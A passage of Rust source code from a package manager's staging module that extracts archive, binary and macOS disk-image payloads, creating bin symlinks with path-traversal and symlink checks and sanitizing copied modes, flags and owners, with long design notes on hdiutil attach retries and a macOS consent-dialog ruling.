    // A row that signs no `tree_root` has nothing to compare the decoded tree against
    // ([`verify_and_stage`] step 3), so its zstd frames must carry the producer's content
    // checksum. Admission (`crate::vendor::check_row`) lets no such row through on the zstd
    // lanes: a release bundle (`payload = ""`) and an `https` row must sign a root, and the
    // vendor-direct lanes take no `tar-zst`. This stays for a caller that stages a row
    // without admitting it, and for a `tar-zst` row over the release protocol.
    let checksum = if artifact.tree_root.is_empty() {
        FrameChecksum::Required
    } else {
        FrameChecksum::IfPresent
    };
    let mut folded: Option<TreeAccumulator> = match artifact.payload.as_str() {
        "" => Some(
            extract_tar_zst_tree(
                archive,
                dest,
                cap,
                MAX_ENTRIES,
                ExtractOptions::default(),
                checksum,
            )
            .map_err(StageError::Extract)?,
        ),
        "tar-zst" => Some(
            extract_tar_zst_tree(archive, dest, cap, MAX_ENTRIES, vendor, checksum)
                .map_err(StageError::Extract)?,
        ),
        "tar-gz" => Some(
            extract_tar_gz_tree(archive, dest, cap, MAX_ENTRIES, vendor)
                .map_err(StageError::Extract)?,
        ),
        "zip" => Some(
            extract_zip_tree(archive, dest, cap, MAX_ENTRIES, vendor)
                .map_err(StageError::Extract)?,
        ),
        "raw-binary" | "tar-gz-binary" => Some(stage_binary(artifact, archive, dest, cap)?),
        "dmg" => {
            stage_dmg(archive, dest)?;
            None
        }
        other => return Err(payload2("unknown payload lane: ", other)),
    };
    apply_links(dest, &artifact.links, folded.as_mut())?;
    match folded {
        Some(tree) => {
            // The disk must spell the fold back before its root is anyone's record
            // (`TreeAccumulator`'s docs).
            tree.require_spelled_back(dest)
                .map_err(StageError::Extract)?;
            let modes = tree.declared_modes();
            Ok((tree.root(), modes))
        }
        None => Ok((
            tree_root(dest).map_err(StageError::Io)?,
            DeclaredModes::new(),
        )),
    }
}

/// A [`StageError::Payload`] from `<head><detail>`.
fn payload2(head: &str, detail: &str) -> StageError {
    StageError::Payload(format!("{head}{detail}"))
}

/// The single-binary lanes: the download (`raw-binary`), or the one regular file at the root
/// of its gzip tar (`tar-gz-binary`, [`crate::extract::stage_tar_gz_member`]), becomes
/// `bin/<entry>` at `0755` under the platform's executable spelling
/// ([`crate::store::ToolName::exe_file`]: `bin/claude`, `bin/claude.exe` on Windows),
/// through the archive lanes' write loop, so it folds as an archived `bin/<entry>` would.
fn stage_binary(
    artifact: &Artifact,
    archive: &Path,
    dest: &Path,
    cap: u64,
) -> Result<TreeAccumulator, StageError> {
    // Repeats `vendor::check_row` (run before download): this is also the authoring
    // producer, and a separator here would be a path, not a name.
    let Some(tool) = crate::store::ToolName::new(&artifact.entry) else {
        return Err(payload2(
            "the entry is not a single admissible tool name: ",
            &artifact.entry,
        ));
    };
    std::fs::create_dir_all(dest).map_err(StageError::Io)?;
    crate::extract::require_empty_destination(dest).map_err(StageError::Extract)?;
    let bin = dest.join("bin");
    refuse_symlinked_bin(&bin)?;
    // Made through the fold at the one directory mode, `0755`, so the `links` laid after it
    // find `bin` among the names this stage made.
    let mut tree = TreeAccumulator::new();
    crate::extract::make_dir_exact(dest, &bin, Path::new("bin"), &mut tree)
        .map_err(StageError::Extract)?;
    let target = bin.join(tool.exe_file());
    let written = if artifact.payload == "tar-gz-binary" {
        crate::extract::stage_tar_gz_member(archive, &target, 0o755, cap)
    } else {
        let file = std::fs::File::open(archive).map_err(StageError::Io)?;
        crate::extract::stage_file(file, &target, 0o755, cap)
    }
    .map_err(StageError::Extract)?;
    let rel = crate::extract::rel_bytes_under(dest, &target).map_err(StageError::Extract)?;
    tree.record_file(rel, written.mode, written.content_sha_hex);
    Ok(tree)
}

/// Whether a `links` target is admissible: a relative, `..`-free, `.`-free, separator-clean
/// path (`vendor::check_row`'s rule, repeated because this is also the authoring producer).
fn link_target_admissible(target: &str) -> bool {
    if target.is_empty()
        || target.starts_with('/')
        || target.ends_with('/')
        || target.contains('\0')
        || target.contains('\\')
    {
        return false;
    }
    target
        .split('/')
        .all(|seg| !seg.is_empty() && seg != "." && seg != "..")
        && Path::new(target)
            .components()
            .all(|c| matches!(c, Component::Normal(_)))
}

/// Refuse a staged `bin` that exists as anything but a real directory: `create_dir_all`,
/// `set_mode` and the link creation all follow a `bin` symlink, so a staged
/// `bin -> <anywhere>` would chmod that directory and plant links in it, outside the stage.
fn refuse_symlinked_bin(bin: &Path) -> Result<(), StageError> {
    match std::fs::symlink_metadata(bin) {
        Ok(m) if !m.is_dir() => Err(StageError::Payload(String::from(
            "links: the staged `bin` is a symlink or a file, not a directory",
        ))),
        _ => Ok(()),
    }
}

/// Whether any proper ancestor of `dest/<target>` below `dest` is a symlink — the probe
/// and the link would then be answered by a tree the digest does not describe.
fn target_ancestor_is_symlink(dest: &Path, target: &str) -> bool {
    let mut cur = dest.to_path_buf();
    let mut comps = Path::new(target).components().peekable();
    while let Some(c) = comps.next() {
        if comps.peek().is_none() {
            break;
        }
        cur.push(c);
        if std::fs::symlink_metadata(&cur).is_ok_and(|m| m.is_symlink()) {
            return true;
        }
    }
    false
}

/// Create the row's `links`: for every `(name, target)`, the relative symlink
/// `bin/<name> -> ../<target>`, recorded in the open fold (when there is one) so the root
/// closes over the finished tree. Fail-closed on a name that is not a tool name, a target
/// that is not a clean relative path, is absent (the link would dangle) or is reached
/// through a symlinked directory, a staged `bin` that is not a real directory, or a
/// `bin/<name>` something already occupies.
fn apply_links(
    dest: &Path,
    links: &BTreeMap<String, String>,
    mut tree: Option<&mut TreeAccumulator>,
) -> Result<(), StageError> {
    if links.is_empty() {
        return Ok(());
    }
    let bin = dest.join("bin");
    refuse_symlinked_bin(&bin)?;
    for (name, target) in links {
        if crate::store::ToolName::new(name).is_none() {
            return Err(payload2(
                "links name is not an admissible tool name: ",
                name,
            ));
        }
        if !link_target_admissible(target) {
            return Err(payload2(
                "links target must be a relative, `..`-free path inside the staged tree: ",
                target,
            ));
        }
        if target_ancestor_is_symlink(dest, target) {
            return Err(payload2(
                "links target passes through a symlinked directory: ",
                target,
            ));
        }
        if std::fs::symlink_metadata(dest.join(target)).is_err() {
            return Err(payload2("links target is not in the staged tree: ", target));
        }
        let link = bin.join(name);
        // The fold records the link as `bin/<name>`, so `bin` must be the name the stage
        // made, not one the filesystem folds onto it (an archive's `Bin/` on
        // case-insensitive APFS), at the stage's one directory mode.
        match tree.as_deref_mut() {
            Some(tree) => {
                let raw = Path::new("bin").join(name);
                crate::extract::make_dir_exact(dest, &bin, &raw, tree)
                    .map_err(StageError::Extract)?;
            }
            None => {
                std::fs::create_dir_all(&bin).map_err(StageError::Io)?;
                crate::platform::set_mode(&bin, crate::extract::safe_mode(0, true))
                    .map_err(StageError::Io)?;
            }
        }
        if std::fs::symlink_metadata(&link).is_ok() {
            return Err(payload2(
                "links name collides with a staged entry: bin/",
                name,
            ));
        }
        let mut rel_target = PathBuf::from("..");
        rel_target.push(target);
        crate::extract::create_symlink(&rel_target, &link).map_err(StageError::Io)?;
        if let Some(tree) = tree.as_deref_mut() {
            let rel = crate::extract::rel_bytes_under(dest, &link).map_err(StageError::Extract)?;
            let target_bytes = crate::platform::os_str_bytes(rel_target.as_os_str());
            tree.record_symlink(rel, target_bytes);
        }
    }
    Ok(())
}

/// The mount point for a `dmg` stage: a sibling of `dest` named `<dest>.mnt`, outside every
/// scratch recogniser (`store::stage_scratch_of` wants `<n>.incoming-<digits>`), so neither
/// the store sweep nor gc ever `remove_dir_all`s a live mount; the [`Mount`] guard reclaims
/// it on every path.
#[cfg(target_os = "macos")]
#[cfg(not(test))]
fn dmg_mount_point(dest: &Path) -> Result<PathBuf, StageError> {
    let name = dest
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| payload2("dmg stage dir has no name: ", &dest.to_string_lossy()))?;
    let mut mnt = String::from(name);
    mnt.push_str(".mnt");
    Ok(dest.with_file_name(mnt))
}

/// Run `/usr/bin/<tool>` to completion with no stdin; a non-zero exit is a
/// [`StageError::Payload`] naming the tool and the tail of its stderr.
#[cfg(target_os = "macos")]
fn run_tool(tool: &str, args: &[&std::ffi::OsStr]) -> Result<(), StageError> {
    let mut path = String::from("/usr/bin/");
    path.push_str(tool);
    let out = aterm_uds::spawnfd::command(&path)
        .args(args)
        .stdin(aterm_uds::spawnfd::Stdio::null())
        .output()
        .map_err(StageError::Io)?;
    if out.status.success() {
        return Ok(());
    }
    Err(tool_failed(tool, out.status.code(), &out.stderr))
}

/// `<tool> failed (exit N): <reason>`: the last stderr line is where hdiutil and ditto put
/// the reason (`hdiutil: attach failed - Resource temporarily unavailable`).
#[cfg(target_os = "macos")]
fn tool_failed(tool: &str, code: Option<i32>, stderr: &[u8]) -> StageError {
    let mut m = String::from(tool);
    m.push_str(" failed");
    if let Some(code) = code {
        m.push_str(" (exit ");
        m.push_str(&code.unsigned_abs().to_string());
        m.push(')');
    }
    let stderr = String::from_utf8_lossy(stderr);
    let tail = stderr.trim();
    if !tail.is_empty() {
        m.push_str(": ");
        m.push_str(tail.lines().last().unwrap_or(tail));
    }
    StageError::Payload(m)
}

/// Run `/usr/bin/<tool>` to completion with no stdin and return its stdout; a
/// non-zero exit is the same [`StageError::Payload`] [`run_tool`] reports.
#[cfg(target_os = "macos")]
fn capture_tool(tool: &str, args: &[&std::ffi::OsStr]) -> Result<String, StageError> {
    let mut path = String::from("/usr/bin/");
    path.push_str(tool);
    let out = aterm_uds::spawnfd::command(&path)
        .args(args)
        .stdin(aterm_uds::spawnfd::Stdio::null())
        .output()
        .map_err(StageError::Io)?;
    if !out.status.success() {
        return Err(tool_failed(tool, out.status.code(), &out.stderr));
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// One image as `hdiutil info` reports it: the device node to eject it by (the block's first
/// `/dev/` entity, the image's own node, whose eject tears the synthesised APFS container
/// down with it) and where each of its entities is mounted.
#[cfg(target_os = "macos")]
struct AttachedImage {
    image: PathBuf,
    node: PathBuf,
    mounted_at: Vec<PathBuf>,
}

/// Parse `hdiutil info`'s plain-text report into one [`AttachedImage`] per attached image:
/// a `====…` rule separates the blocks, `key : value` lines carry `image-path`, and every
/// entity is a tab-separated `<dev-entry>\t<content-hint>[\t<mount-point>]` line whose third
/// field is present only while it is mounted. A block with no `/dev/` entity (an image being
/// attached at this instant) is skipped.
///
/// A pure function over the text, so the shape a failed attach leaves is pinned on any
/// machine (`a_failed_attach_leaves_a_carcass_the_hdiutil_report_names`).
#[cfg(target_os = "macos")]
fn parse_hdiutil_info(report: &str) -> Vec<AttachedImage> {
    let mut out: Vec<AttachedImage> = Vec::new();
    let mut block: Vec<&str> = Vec::new();
    for line in report.lines() {
        if line.starts_with("====") {
            out.extend(parse_hdiutil_block(&block));
            block.clear();
        } else {
            block.push(line);
        }
    }
    out.extend(parse_hdiutil_block(&block));
    out
}

/// One `hdiutil info` block; `None` unless it names an image and lists a device.
#[cfg(target_os = "macos")]
fn parse_hdiutil_block(lines: &[&str]) -> Option<AttachedImage> {
    let mut image: Option<PathBuf> = None;
    let mut node: Option<PathBuf> = None;
    let mut mounted_at: Vec<PathBuf> = Vec::new();
    for line in lines {
        if let Some(rest) = line.strip_prefix("/dev/") {
            let mut fields = rest.split('\t');
            let dev = fields.next().unwrap_or("").trim();
            if node.is_none() && !dev.is_empty() {
                let mut n = String::from("/dev/");
                n.push_str(dev);
                node = Some(PathBuf::from(n));
            }
            // Field 3 is the mount point while the entity is mounted; absent or empty
            // otherwise. It may contain spaces (`/Volumes/aterm 0.81.0`), never a tab.
            if let Some(point) = fields.nth(1).map(str::trim).filter(|p| !p.is_empty()) {
                mounted_at.push(PathBuf::from(point));
            }
        } else if let Some((key, value)) = line.split_once(':')
            && key.trim() == "image-path"
        {
            image = Some(PathBuf::from(value.trim()));
        }
    }
    Some(AttachedImage {
        image: image?,
        node: node?,
        mounted_at,
    })
}

/// Whether two paths name the same file: literally (`hdiutil info` echoes the path the
/// attaching process passed), or canonically (`/var/folders` vs `/private/var/folders`).
#[cfg(target_os = "macos")]
fn same_file(a: &Path, b: &Path) -> bool {
    a == b
        || match (a.canonicalize(), b.canonicalize()) {
            (Ok(x), Ok(y)) => x == y,
            _ => false,
        }
}

/// A disk image the `dmg` lane reads from, released on EVERY path: the folder that holds
/// its root, an explicit [`Attached::detach`] on the happy path so a failed release is
/// reported rather than swallowed, and `Drop` for the error paths. [`Mount`] is
/// `hdiutil`'s; a test stands a scratch folder in for the mounted image ([`attach_image`]).
#[cfg(target_os = "macos")]
trait Attached {
    /// The folder that holds the image's root.
    fn root(&self) -> &Path;
    /// Release the image and report; `Drop` then has nothing left to do.
    fn detach(&mut self) -> Result<(), StageError>;
}

/// Attach `image` for the stage at `dest`: `hdiutil` ([`Mount::attach`]).
#[cfg(all(target_os = "macos", not(test)))]
fn attach_image(image: &Path, dest: &Path) -> Result<Box<dyn Attached>, StageError> {
    Ok(Box::new(Mount::attach(image, dest)?))
}

/// A test build's [`attach_image`]: the arm this thread set ([`image_arm::with`]) and,
/// with none set, a refusal, never `hdiutil`. Attaching a disk image and reading inside it
/// drew macOS's removable-volume dialog on a Mac without Full Disk Access ([`stage_dmg`]),
/// so a default test run attaches none: the stage is tested over a scratch folder standing
/// in for the mounted image. The explicit `dmg_acceptance` bench links the normal debug
/// library, whose stage uses [`Mount::attach`].
#[cfg(all(target_os = "macos", test))]
fn attach_image(image: &Path, dest: &Path) -> Result<Box<dyn Attached>, StageError> {
    image_arm::attach(image, dest)
}

/// The test seam behind [`attach_image`]: which arm attaches this thread's images.
#[cfg(all(target_os = "macos", test))]
mod image_arm {
    use std::cell::RefCell;
    use std::path::Path;

    use super::{Attached, StageError};

    /// What attaches an image for a stage: `(image, dest)` to the attached image.
    pub(super) type Arm = Box<dyn Fn(&Path, &Path) -> Result<Box<dyn Attached>, StageError>>;

    thread_local! {
        static ARM: RefCell<Option<Arm>> = const { RefCell::new(None) };
    }

    /// Run `f` with `arm` attaching this thread's images; none again after, unwinding
    /// included.
    pub(super) fn with<R>(arm: Arm, f: impl FnOnce() -> R) -> R {
        struct Reset;
        impl Drop for Reset {
            fn drop(&mut self) {
                ARM.with(|a| *a.borrow_mut() = None);
            }
        }
        ARM.with(|a| *a.borrow_mut() = Some(arm));
        let _reset = Reset;
        f()
    }

    /// Attach `image` for the stage at `dest` with this thread's arm.
    pub(super) fn attach(image: &Path, dest: &Path) -> Result<Box<dyn Attached>, StageError> {
        ARM.with(|a| match a.borrow().as_ref() {
            Some(arm) => arm(image, dest),
            None => Err(StageError::Payload(String::from(
                "this test thread attaches no disk image: a default test run never runs hdiutil",
            ))),
        })
    }
}

/// An attached disk image, detached on EVERY path (`Drop` for the error paths, an
/// explicit [`Attached::detach`] on the happy path so a detach failure is reported
/// rather than swallowed). The mount point directory is removed with it.
///
/// The guard is armed before `hdiutil attach` runs: a non-zero `attach` (about one attempt
/// in five under back-to-back traffic, `Resource temporarily unavailable`) can leave the
/// image's `/dev/disk*` entities behind, unmounted, for the life of the boot, and they make
/// the next attach of the same image fail `Resource busy`.
#[cfg(target_os = "macos")]
struct Mount {
    image: PathBuf,
    point: PathBuf,
    /// `hdiutil attach` has been spawned for this image: the guard owes a detach whatever
    /// the exit status claimed.
    attached: bool,
}

/// How many times `hdiutil attach` is attempted. The failure it exists for, a transient
/// `Resource temporarily unavailable`, was measured at 5 in 20 attaches on an idle Mac,
/// each succeeding on the next attempt once the failed one's devices were reclaimed.
#[cfg(target_os = "macos")]
#[cfg(not(test))]
const ATTACH_ATTEMPTS: u32 = 4;

#[cfg(target_os = "macos")]
impl Mount {
    /// `hdiutil attach -nobrowse -readonly -noverify -noautoopen -mountpoint <point>
    /// <image>`: not in Finder, never written, no second checksum pass (the download's digest
    /// gate already ran), nothing auto-opened. With stdin closed an image that demands a
    /// license click fails instead of hanging. Not `-quiet`, which suppresses the failure
    /// line too. A failed attempt is reclaimed ([`Mount::detach_now`]) and retried, up to
    /// [`ATTACH_ATTEMPTS`].
    #[cfg(not(test))]
    fn attach(image: &Path, dest: &Path) -> Result<Self, StageError> {
        let point = dmg_mount_point(dest)?;
        // An empty leftover from a crashed run is ours; a live mount there refuses the
        // `remove_dir` and then the attach, which is the right outcome.
        let _ = std::fs::remove_dir(&point);
        std::fs::create_dir_all(&point).map_err(StageError::Io)?;
        let mut last: Option<StageError> = None;
        for _ in 0..ATTACH_ATTEMPTS {
            let mut m = Mount {
                image: image.to_path_buf(),
                point: point.clone(),
                attached: true,
            };
            match run_tool(
                "hdiutil",
                &[
                    "attach".as_ref(),
                    "-nobrowse".as_ref(),
                    "-readonly".as_ref(),
                    "-noverify".as_ref(),
                    "-noautoopen".as_ref(),
                    "-mountpoint".as_ref(),
                    m.point.as_os_str(),
                    image.as_os_str(),
                ],
            ) {
                Ok(()) => return Ok(m),
                Err(e) => {
                    // Reclaim what the failed attempt left attached, or the retry meets it
                    // as `Resource busy` and the devices leak for the life of the boot.
                    let _ = m.detach_now();
                    last = Some(e);
                }
            }
        }
        let _ = std::fs::remove_dir(&point);
        Err(last.unwrap_or_else(|| {
            StageError::Payload(String::from("hdiutil attach was never attempted"))
        }))
    }

    fn detach_now(&mut self) -> Result<(), StageError> {
        if !self.attached {
            return Ok(());
        }
        self.attached = false;
        let by_point = run_tool(
            "hdiutil",
            &["detach".as_ref(), "-quiet".as_ref(), self.point.as_os_str()],
        );
        let r = match by_point {
            Ok(()) => Ok(()),
            // Either nothing is mounted at our point (an `attach` that exited non-zero
            // after attaching the devices) or something holds a file open on the image
            // (usually Spotlight): eject the devices the system lists for this image.
            Err(_) => self.eject_own_devices(),
        };
        let _ = std::fs::remove_dir(&self.point);
        r
    }

    /// Eject every device `hdiutil info` still lists for this image, and prove it worked by
    /// re-reading the report.
    ///
    /// Only an attachment wholly unmounted, or mounted nowhere but our own point, is
    /// ejected: `-mountpoint` puts our mount there and nowhere else, so one mounted
    /// elsewhere is the user's own copy, not ours to yank (and a `Resource busy` attach
    /// against it is a refusal worth reporting).
    fn eject_own_devices(&self) -> Result<(), StageError> {
        let nodes = self.own_devices()?;
        if nodes.is_empty() {
            return Ok(());
        }
        let mut last: Option<StageError> = None;
        for node in &nodes {
            if run_tool(
                "hdiutil",
                &["detach".as_ref(), "-quiet".as_ref(), node.as_os_str()],
            )
            .is_ok()
            {
                continue;
            }
            if let Err(e) = run_tool(
                "hdiutil",
                &[
                    "detach".as_ref(),
                    "-force".as_ref(),
                    "-quiet".as_ref(),
                    node.as_os_str(),
                ],
            ) {
                last = Some(e);
            }
        }
        if self.own_devices()?.is_empty() {
            return Ok(());
        }
        Err(last.unwrap_or_else(|| {
            payload2(
                "hdiutil could not detach the image: ",
                &self.image.to_string_lossy(),
            )
        }))
    }

    /// The device nodes `hdiutil info` lists for this image that are ours to eject
    /// (see [`Mount::eject_own_devices`]).
    fn own_devices(&self) -> Result<Vec<PathBuf>, StageError> {
        let report = capture_tool("hdiutil", &["info".as_ref()])?;
        Ok(self.reclaimable(&report))
    }

    /// The device nodes an `hdiutil info` report holds for this image that are ours to
    /// eject: a pure function of the report text.
    fn reclaimable(&self, report: &str) -> Vec<PathBuf> {
        parse_hdiutil_info(report)
            .into_iter()
            .filter(|a| same_file(&a.image, &self.image))
            .filter(|a| a.mounted_at.iter().all(|p| same_file(p, &self.point)))
            .map(|a| a.node)
            .collect()
    }
}

#[cfg(target_os = "macos")]
impl Attached for Mount {
    fn root(&self) -> &Path {
        &self.point
    }

    fn detach(&mut self) -> Result<(), StageError> {
        self.detach_now()
    }
}

/// The one `.app` directory at the root of `dir` (a mounted image). Anything else there
/// (`Applications` link, `.background`, `.DS_Store`, a README) is ignored; zero or several
/// apps is a refusal. A function of the directory, so the rule is testable without an image.
#[cfg(target_os = "macos")]
fn single_app_in(dir: &Path) -> Result<PathBuf, StageError> {
    let mut apps: Vec<PathBuf> = Vec::new();
    for entry in std::fs::read_dir(dir).map_err(StageError::Io)?.flatten() {
        let path = entry.path();
        let is_app = path
            .extension()
            .is_some_and(|e| e.eq_ignore_ascii_case("app"));
        // A real directory, not a link to one.
        if is_app && std::fs::symlink_metadata(&path).is_ok_and(|m| m.is_dir()) {
            apps.push(path);
        }
    }
    apps.sort();
    if apps.len() == 1 {
        return Ok(apps.swap_remove(0));
    }
    Err(StageError::DmgAppCount(apps.len()))
}

#[cfg(target_os = "macos")]
impl Drop for Mount {
    fn drop(&mut self) {
        let _ = self.detach_now();
    }
}

/// The `dmg` lane: attach the image read-only, require exactly one `.app` at its
/// root (otherwise [`StageError::DmgAppCount`]), `ditto` that bundle into `dest` (symlinks, contents and extended attributes as
/// the image carries them; no ACL), give it the archive lanes' modes and the stage's
/// owner and group, clear any flag that would make a member immutable, and refuse any
/// link in it that leaves the stage root ([`vet_copied_tree`]), detach. Nothing else on
/// the image is copied and nothing on it is executed.
///
/// # The modes are the stage's, not the image's (AT3, ruling 2026-10-10)
///
/// Until 2026-10-10 this lane kept the image's mode bits, on the reasoning that the
/// bundle is the vendor's, signed and notarized as laid out, while the archive lanes
/// sanitized theirs ([`crate::extract::safe_mode`]). `ditto` copies a bundle's modes
/// verbatim (measured that day: a group- or world-writable file or directory, an
/// owner-only or read-only file and an ACL granting everyone write all survive an
/// unprivileged `hdiutil create` and `ditto`; setuid, setgid and sticky survive `ditto`
/// when it runs as root, ditto(1), which is how a root-owned system prefix stages), and
/// the walk checked only link targets and entry kinds, so a signed image's bundle could
/// land a setuid or world-writable member in a store that, under a system prefix, every
/// user runs from. Fail closed: the lane gives every copied directory and regular file
/// the same mode as every other lane does, through the same function, passes
/// `--noacl` (with `--noclone`: on one volume `ditto` clones a file, ACL included,
/// whatever `--noacl` says, measured 2026-10-19 on macOS 27, so a folder on the store's
/// volume, a mount-free reader's or the tests' stand-in, would land its ACLs), clears
/// the immutable and append-only flags `ditto` also copies, and gives
/// every entry the stage root's owner and group, which `ditto` would otherwise keep from
/// the image ([`give_owner`], added on the lane's review the same day), because no lane
/// is the place a store tree gets a permission the others strip. A code
/// signature seals contents, not permission bits (measured: an ad-hoc signed bundle
/// verifies `--deep --strict` before and after its modes are changed).
///
/// The tree root contract could change at no cost: no published index row uses
/// `kind = "app-bundle"`, `payload = "dmg"` (index 68 names exactly 12 programs: the ten
/// release bundles of `atpkg_publish::programs::PROGRAMS`, and codex and claude, https
/// `binary` rows whose vendor-direct lane admits nothing else, `vendor_direct::resolve::admit`).
/// So a `dmg` tree's `tree_root` now folds `755` or `644` in every file's mode slot,
/// never the image's own bits, and a future `dmg` row is signed against that sanitized
/// tree (the root [`stage_payload`] returns over the image).
///
/// # The attach draws a consent dialog, so no row may name this lane (2026-10-19)
///
/// On 2026-10-17 at 11:33:14 the owner's aterm logged "macOS showed a consent dialog for
/// SystemPolicyRemovableVolumes to a program of this aterm", 27 s into a
/// `targo --unverified test -p atpkg` an agent had started in one of its tabs; that suite's
/// only disk-image work was this lane's two real-image tests (`hdiutil create
/// -srcfolder`, then this attach and the `ditto` read inside it). It is the only such
/// dialog that log holds, and aterm had no Full Disk Access then. A user's stage of a
/// `payload = "dmg"` row does the same attach and read, so it would draw the same dialog,
/// naming aterm, for every user without Full Disk Access; and a TCC dialog has no timeout
/// (`docs/DESIGN-macos-tcc-prompts-2026-08-30.md` §1.4): the stage, an unattended
/// first-launch install among them, would park until someone answered it. Full Disk
/// Access, which aterm asks for at launch, covers the service: on 2026-10-17 with the
/// grant held, a tab listed, read and wrote a USB drive with no dialog and `tccd` was
/// asked nothing about removable volumes (that doc's §7 S4). The same spike found a
/// mounted disk image unprotected on its VMs, which this Mac contradicts.
///
/// So [`crate::vendor::check_row`] refuses a `dmg` row before any download (its last
/// check, so every other field of the row is still judged) until an image can be read
/// without attaching it. The refusal costs nothing today, as no published row names the
/// lane (above). Waiting on a grant the user may never give is a stall; the attach also
/// needs a live bootstrap context (`hdiutil` answers `ENXIO` to an orphan, which is why
/// the app's own updater stages from a zip), fails transiently (5 attaches in 20,
/// the bounded attach retry loop), and costs seconds an install does not have. A mount-free reader
/// would stand where [`attach_image`] does and hand this lane a folder, as the tests'
/// stand-in does. Everything after it (the picker, the copy, the vet) stays.
#[cfg(target_os = "macos")]
fn stage_dmg(image: &Path, dest: &Path) -> Result<(), StageError> {
    std::fs::create_dir_all(dest).map_err(StageError::Io)?;
    crate::extract::require_empty_destination(dest).map_err(StageError::Extract)?;
    let mut mount = attach_image(image, dest)?;
    let app = single_app_in(mount.root())?;
    let name = app
        .file_name()
        .ok_or_else(|| payload2("dmg bundle has no name: ", &app.to_string_lossy()))?;
    let out = dest.join(name);
    let (no_acl, no_clone) = ("--noacl".as_ref(), "--noclone".as_ref());
    run_tool(
        "ditto",
        &[no_acl, no_clone, app.as_os_str(), out.as_os_str()],
    )?;
    // `ditto` laid the bundle VERBATIM, links and modes included, with nothing of ours
    // vetting them on the way — so vet and sanitize them now, before the mount is
    // released and long before the swap: the archive lanes' rules, applied to the
    // finished copy.
    if let Err(e) = vet_copied_tree(dest, &out) {
        let _ = mount.detach();
        return Err(e);
    }
    mount.detach()
}

/// Make the copied `.app` at `dir` a tree the archive lanes could have laid, under the stage
/// `root`. `dir` and every directory and regular file under it get the archive lanes' mode
/// ([`crate::extract::safe_mode`]) and lose any immutable or append-only flag, each directory
/// before it is read. Every entry, links included, gets the owner and group of the stage
/// `root` ([`give_owner`]), which this stage made exclusively, so its owner is the stager.
///
/// Every symlink under `dir` must resolve lexically inside the stage `root`
/// ([`crate::extract::vet_symlink`], the archive lanes' per-entry rule, applied after the
/// fact because `ditto` keeps links as the image carries them): otherwise a `links` target
/// or a shim could resolve through one out of the store. A link's own mode is left alone
/// (the tree root leaves it out). Anything that is not a file, a directory or a symlink is
/// refused, naming the entry.
#[cfg(target_os = "macos")]
fn vet_copied_tree(root: &Path, dir: &Path) -> Result<(), StageError> {
    use std::os::unix::fs::MetadataExt as _;
    let stage = std::fs::symlink_metadata(root).map_err(StageError::Io)?;
    vet_copied_entries(root, dir, Owner(stage.uid(), stage.gid()))
}

/// The owner and group every entry of a copied bundle is given: the stage root's
/// ([`vet_copied_tree`]).
#[cfg(target_os = "macos")]
#[derive(Clone, Copy)]
struct Owner(u32, u32);

/// [`vet_copied_tree`]'s walk of `dir`, giving each entry `owner`.
#[cfg(target_os = "macos")]
fn vet_copied_entries(root: &Path, dir: &Path, owner: Owner) -> Result<(), StageError> {
    give_safe_mode(dir, true, owner)?;
    for entry in std::fs::read_dir(dir).map_err(StageError::Io)? {
        let entry = entry.map_err(StageError::Io)?;
        let path = entry.path();
        // `DirEntry::file_type` never follows a link.
        let ft = entry.file_type().map_err(StageError::Io)?;
        if ft.is_symlink() {
            let rel = path.strip_prefix(root).map_err(|_| {
                StageError::Extract(ExtractError::Rejected(
                    crate::extract::ExtractReject::RootEscape,
                    path.clone(),
                ))
            })?;
            let target = std::fs::read_link(&path).map_err(StageError::Io)?;
            crate::extract::vet_symlink(root, rel, &target, 0)
                .map_err(|r| StageError::Extract(ExtractError::Rejected(r, rel.to_path_buf())))?;
            let meta = std::fs::symlink_metadata(&path).map_err(StageError::Io)?;
            give_owner(&path, &meta, owner)?;
        } else if ft.is_dir() {
            vet_copied_entries(root, &path, owner)?;
        } else if ft.is_file() {
            give_safe_mode(&path, false, owner)?;
        } else {
            return Err(payload2(
                "dmg bundle carries an entry that is not a file, directory or symlink: ",
                &path.to_string_lossy(),
            ));
        }
    }
    Ok(())
}

/// Give the copied directory or regular file at `path` (never a link) the stage's `owner`
/// ([`give_owner`]) and its [`crate::extract::safe_mode`], after clearing any flag that stops
/// its owner changing or removing it ([`crate::platform::OWNER_BINDING_FLAGS`]): `ditto`
/// copies a `uchg` member immutable, which refuses the `chmod` and every later
/// `remove_dir_all`.
#[cfg(target_os = "macos")]
fn give_safe_mode(path: &Path, is_dir: bool, owner: Owner) -> Result<(), StageError> {
    use std::os::macos::fs::MetadataExt as _;
    let meta = std::fs::symlink_metadata(path).map_err(StageError::Io)?;
    let flags = meta.st_flags();
    if flags & crate::platform::OWNER_BINDING_FLAGS != 0 {
        crate::platform::set_file_flags(path, flags & !crate::platform::OWNER_BINDING_FLAGS)
            .map_err(StageError::Io)?;
    }
    give_owner(path, &meta, owner)?;
    let mode = crate::platform::permission_mode(&meta) & 0o7777;
    let safe = crate::extract::safe_mode(mode, is_dir);
    if mode != safe {
        crate::platform::set_mode(path, safe).map_err(StageError::Io)?;
    }
    Ok(())
}

/// Give the copied entry at `path` (never followed through a link), whose `lstat` is
/// `meta`, the stage root's `owner` and group when it has any other: `lchown(2)`.
///
/// `ditto` keeps a member's owner and group: as root both as the image records them, and
/// unprivileged any group its user belongs to. An image built by `hdiutil create
/// -srcfolder` records its builder's ids, so under a root-owned system prefix a bundle could
/// land owned by the uid that built it, or `_unknown` (`99`, which every user owns), and
/// that owner could make a member writable again. An archive lane's entry is owned by the
/// stager with its directory's group, which down the copied tree is the stage root's; the
/// walk gives each entry exactly that. A refusal fails the stage.
#[cfg(target_os = "macos")]
fn give_owner(
    path: &Path,
    meta: &std::fs::Metadata,
    Owner(uid, gid): Owner,
) -> Result<(), StageError> {
    use std::os::unix::fs::MetadataExt as _;
    if meta.uid() != uid || meta.gid() != gid {
        std::os::unix::fs::lchown(path, Some(uid), Some(gid)).map_err(StageError::Io)?;
    }
    Ok(())
}

/// `dmg` needs `hdiutil` and `ditto`; off macOS the lane fails closed.
#[cfg(not(target_os = "macos"))]
fn stage_dmg(_image: &Path, _dest: &Path) -> Result<(), StageError> {
    Err(StageError::Payload(String::from(
        "dmg payloads can only be staged on macOS (hdiutil/ditto)",
    )))
}

/// Whether [`DISK_REVERIFY_ENV`] arms the on-disk cross-check. Passed down as a bool so
/// [`reverified_root`] stays pure and tests drive both ways without `std::env::set_var`.
fn disk_reverify_armed() -> bool {
